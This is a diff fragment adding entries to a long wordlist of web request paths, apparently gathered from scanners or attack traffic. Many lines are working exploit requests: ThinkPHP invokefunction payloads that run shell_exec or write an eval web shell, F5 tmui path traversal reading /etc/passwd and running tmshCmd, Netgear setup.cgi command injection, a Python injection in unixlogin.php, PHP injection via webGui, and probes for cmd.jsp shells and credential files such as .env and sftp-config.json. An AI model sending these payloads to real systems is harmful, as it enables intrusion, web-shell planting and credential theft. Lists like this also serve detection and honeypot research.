 pfbe/.env
+pfblockerng/www/index.php
 pgadmin
 pgadmin.log
 pgnim
@@ -8433,6 +8615,7 @@ pinterest
 pip-log.txt
 pk1914.php
 pkg/dspkginstall
+pki/images/keyManager_title.ico
 pkm
 pkm/.env
 plain
@@ -8584,6 +8767,8 @@ pms/report/infoOffer/query_showConsumptionRepor
 pms/workflow/
 pms/workflow/queryWorkflowAlertRecipients.action
 pmyadmin/
+poc.jsp/
+poc.jsp?cmd=cat+%2Fetc%2Fpasswd
 pods
 policies
 policies.aspx
@@ -8644,6 +8829,7 @@ preview
 previewCommunication.js
 price
 price_hawk_client/.env
+printer/objects/list
 printing
 prisma
 prisma/.env
@@ -8736,6 +8922,7 @@ project.xml
 project/.env.example
 projectConfig
 project_root/.env
+projector-calibration
 projects
 projet/1/1
 projets-client
@@ -8801,7 +8988,7 @@ public/index.php/?s=index/%5Cthink%5Ctemplate%5Cdriver%5Cfile/write&cacheFile=sp
 public/index.php/?s=index/%5Cthink%5Cview%5Cdriver%5CPhp/display&content=echo%20%3C?php%20@eval($_POST%5Bspread%5D);?%3E%20%3E%3Espread.php
 public/index.php?a=fetch&templateFile=public/index&prefix=''&content=%3Cphp%3Efile_put_contents('spread.php','%3C?php%20@eval($_POST%5Bspread%5D);?%3E')
 public/index.php?s=/Index/%09hink%07pp/invokefunction&function=call_user_func_array&vars%5B0%5D=shell_exec&vars%5B1%5D%5B%5D=id
-public/index.php?s=/Index/%09hink%07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=id
+public/index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=shell_exec&vars%5B1%5D%5B%5D=id
 public/index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=id
 public/index.php?s=index/%5Cthink%5CContainer/invokefunction&function=call_user_func_array&vars%5B0%5D=file_put_contents&vars%5B1%5D%5B%5D=spread.php&vars%5B1%5D%5B%5D=%3C?php%20@eval($_POST%5Bspread%5D);?%3E
 public/index.php?s=index/%5Cthink%5CContainer/invokefunction&function=call_user_func_array&vars%5B0%5D=file_put_contents&vars%5B1%5D%5B%5D=spread.php&vars%5B1%5D%5B1%5D=%3C?php%20@eval($_POST%5Bspread%5D);?%3E
@@ -8852,13 +9039,16 @@ py
 pyb33.542
 python.php
 q.php
+q3Gr
 q4iN
 qBs6
 qCGCLyY
 qE7p
 qKRN
 qOSJ
+qTGP
 qULK
+qUa6
 qa.php
 qa/
 qa/.git/config
@@ -8887,6 +9077,7 @@ qiqi1.php
 qiqi11.php
 qmF9
 qq.php
+qq2H
 qq5262.php
 qqq.php
 qrcode/
@@ -8898,6 +9089,7 @@ query.log
 query?dns=B64
 query?dns=MTI3LjAuMC4x
 query?dns=bG9jYWxob3N0
+query?dns=q80BAAABAAAAAAAAA3d3dwdleGFtcGxlA2NvbQAAAQAB
 query?q=SHOW+DATABASES
 question2
 question2/.env
@@ -8921,11 +9113,13 @@ r57.php
 r57eng.php
 r57shell.php
 r58.php
+r8gL
 r8kH
 r99.php
 rEbD
 rHNT
 rHXK
+rK8h
 rM2l
 rORJ
 raS6
@@ -9136,6 +9330,7 @@ resolve
 resolve?dns=B64
 resolve?dns=MTI3LjAuMC4x
 resolve?dns=bG9jYWxob3N0
+resolve?dns=q80BAAABAAAAAAAAA3d3dwdleGFtcGxlA2NvbQAAAQAB
 resource/dgzc/webroot/images_dg/title_8.jpg
 resource/home/css/person.css
 resource/home/js/common.js
@@ -9168,6 +9363,7 @@ rest/api/latest/projects/%7B%7Bkey%7D%7D/repos/%7B%7Bslug%7D%7D/archive?filename
 rest/api/latest/repos
 rest/applinks/1.0/manifest
 rest/config
+rest/tinymce/1/macro/preview
 restapi
 restapi/.env
 restapi/config.all.php?
@@ -9230,6 +9426,7 @@ routes.php
 routes/.env
 royalerumble
 royalerumble/.env
+rpc
 rpc/balance
 rrB6
 rrhh
@@ -9274,6 +9471,7 @@ s3_credentials.csv
 s3cmd.ini
 s3config.js
 s3config.json
+s8YX
 s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=4jyqfh7x
 sF7l
 sYEK
@@ -9340,6 +9538,7 @@ sbkc.php
 sbkcb.php
 sbp
 sbp/.env
+scgi-bin/platform.cgi
 scheduledtasks
 scheduler
 scheduler/
@@ -9369,6 +9568,7 @@ script/.env
 script/public.js
 script/sysadm/host_daily_audits
 scripts
+scripts/
 scripts/.env
 scripts/Customers.asp
 scripts/FilesVersions.asp
@@ -9512,8 +9712,10 @@ servlet
 servlet-class
 servlet-mapping
 servlet-name
+servlet/GetProductVersion
 servlet/Oracle.xml.xsql.XSQLServlet/soapdocs/webapps/soap/WEB-INF/config/soapConfig.xml
 servlet/Oracle.xml.xsql.XSQLServlet/xsql/lib/XSQLConfig.xml
+servlet/UploadServlet
 servlet/oracle.xml.xsql.XSQLServlet/soapdocs/webapps/soap/WEB-INF/config/soapConfig.xml
 servlet/oracle.xml.xsql.XSQLServlet/xsql/lib/XSQLConfig.xml
 servlet/~ic/bsh.servlet.BshServlet
@@ -9555,6 +9757,7 @@ setup.cgi
 setup.cgi?
 setup.cgi?next_file=afr.cfg&todo=syscmd&cmd=whoami;&curpath=/&currentsetting.htm=1
 setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=whoami;&curpath=/&currentsetting.htm=1
+setup.cgi?todo=debug&x=currentsetting.htm
 setup.php
 setup.sql
 setup.xml
@@ -9562,7 +9765,12 @@ setup/
 setup/eureka_info
 setup/index.jsp
 sfsites/aura
+sftp-config-alt.json
+sftp-config-alt.json.save
+sftp-config-alt.json~
 sftp-config.json
+sftp-config.json.save
+sftp-config.json~
 sg/terraexplorerweb/
 sha.php
 shaAdmin/index.php
@@ -9662,6 +9870,9 @@ sitecore/login
 sitecore/login?ReturnUrl=%2fsitecore%2fshell%2f
 sitecore/shell/ClientBin/Reporting/Report.ashx
 sitecore/shell/Controls/Lib/jQuery/jquery-1.12.4.min.js
+sitemanager.xml
+sitemanager.xml.save
+sitemanager.xml~
 sitemap
 sitemap.aspx
 sitemap.sip/
@@ -9925,6 +10136,7 @@ srv1
 srv6_controller/controller/.env
 srv6_controller/examples/.env
 srv6_controller/node-manager/.env
+ss
 ss.php
 ss_database_backup.sql
 ssaa.php
@@ -10153,6 +10365,7 @@ subscribe
 subscriber
 subscriberonlineservices/api/restricted/portfolio/riskdomain/companies-filters
 sucai/zxkf.png
+sugar_version.json
 sugarcrm.log
 suite
 suite-api/api/auth/token/acquire
@@ -10214,6 +10427,7 @@ symphony/apps/frontend/config/databases.yml
 symphony/config/app.yml
 symphony/config/databases.yml
 sync
+synohdpack/synohdpack.version
 sys.zip
 sys/devices/soc0/pwmleds/leds/blueleds/brightness
 sys/module/bcmdhd/parameters/firmware_path
@@ -10266,6 +10480,7 @@ t00.php
 t000/login-img-3.svg
 t00ls.php
 t3
+t3Of
 t4
 t4mH
 t5
@@ -10279,6 +10494,7 @@ tJFX
 tMEV
 tOh2
 tPKN
+tTSA
 table
 table.htm
 tag
@@ -10575,6 +10791,7 @@ tmp/whmcs.php
 tmp/xd.php
 tmui/login.jsp
 tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
+tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=id
 tn9B
 todo
 token
@@ -10741,6 +10958,7 @@ uCk9
 uN2h
 uO0i
 uRTime-Support
+uTNF
 uUt
 uWLD
 uXMB
@@ -10786,6 +11004,7 @@ unattend.txt
 unauthenticated/provisioning/
 unauthorize
 uncensored
+uncensored?dns=B64
 uncensored?dns=MTI3LjAuMC4x
 uncensored?dns=bG9jYWxob3N0
 uncommon_Sea_Creatures.jsp
@@ -10952,7 +11171,10 @@ v3/api-docs
 v3/api-docs/swagger-config
 v4Kg
 v6/getAppContent
+v6Ke
+vDAb
 vEYH
+vH1m
 vLBY
 vUFK
 vYZ3
@@ -10989,6 +11211,8 @@ vb.rar
 vb.sql
 vb.zip
 vc/main/images/t_logo.jpg
+vcac/
+vcac/?original_uri=http://127.0.0.1%2Fvcac
 vcms/templates/images/newcms/login_logo.jpg
 vendor
 vendor/.env
@@ -10997,6 +11221,7 @@ vendor/.git/config
 vendor/composer/installed.json
 vendor/github.com/gobuffalo/envy/.env
 vendor/github.com/subosito/gotenv/.env
+vendor/htmlawed/htmlawed/htmLawedTest.php
 vendor/jquery-file-upload/
 vendor/laravel/.env
 vendor/laravel/.env.example
@@ -11144,6 +11369,7 @@ watchlist
 wav.php?123
 wb.php
 wc.php
+wc3O
 wcp.php
 wcs/resources/
 wcx_ftp.ini
@@ -11192,6 +11418,7 @@ web1
 web2
 web2/login_template/1.files/Logo1.jpg
 web3
+webGui/images/green-on.png/?path=x&site[x][text]=%3C?php%20phpinfo()%20?%3E
 web_shell_cmd.gch
 webacula/application/config.ini
 webadm/?q=moni_detail.do&action=gragh
@@ -11208,6 +11435,7 @@ webadmin/out
 webadmin/script?command=|%20id
 webadmin/scripts/setup.php
 webadmin/tools/unixlogin.php?login=admin&password=g%27%2C%27%27%29%3Bimport%20os%3Bos.system%28%27id%27%29%23&timeout=5
+webapi/auth
 webapp/
 webapps
 webapps/ROOT/shell.jsp?cmd=id
@@ -11658,6 +11886,7 @@ x86_64/main.env
 x86_64/myconf.env
 x86_64/web-variables.env
 xAl7
+xFl3
 xRQB
 xampp
 xampp/
@@ -11707,6 +11936,7 @@ xml/ns/javaee/web-app_3_0.xsd
 xml/ns/javaee/web-app_4_0.xsd
 xmldata?item=All
 xmlhttp.do
+xmlrpc
 xmlrpc.php
 xmlrpc.php?rsd
 xmlrpc.zip
@@ -11742,6 +11972,8 @@ xy/image/jiantou.png
 xz.php
 y000000000000.cfg
 y000000000025.cfg/
+y4hH
+y5UY
 y79t
 yAJY
 yAl6
@@ -11774,6 +12006,7 @@ yt
 ytube
 yu.php
 yumo.php
+yuuki?pp=env
 yuyang.php
 yyoa/Navigation_help/A6_fuz/style/images/index_eye.gif
 yyx.php
@@ -11797,6 +12030,7 @@ zeroclipboard.swf
 zfstyle_v4/logo/logo_zfoa.png
 zhk.php
 zhui.php
+zimbraAdmin/0MVzAe6pgwe5go1D.jsp
 zimbraAdmin/123.jsp
 zimbraAdmin/cmd.jsp
 zimbraAdmin/cmd.jsp?cmd=whoami
